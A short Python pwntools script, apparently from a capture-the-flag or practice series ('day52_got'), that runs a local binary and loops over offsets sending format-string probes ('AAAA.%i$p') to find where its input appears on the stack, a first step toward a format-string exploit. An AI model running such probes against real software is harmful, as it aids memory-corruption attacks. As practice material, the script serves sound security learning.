from pwn import * 

for i in range(1, 20):
	p = process("./day52_got")
	p.recvuntil(b"note\n")
	p.sendline(b"BB")
	p.recvuntil(b"record\n")
	p.sendline(f"AAAA.%{i}$p".encode())
	out = p.recvall(timeout = 1)
	if b"41414141" in out:
		print(i, out)
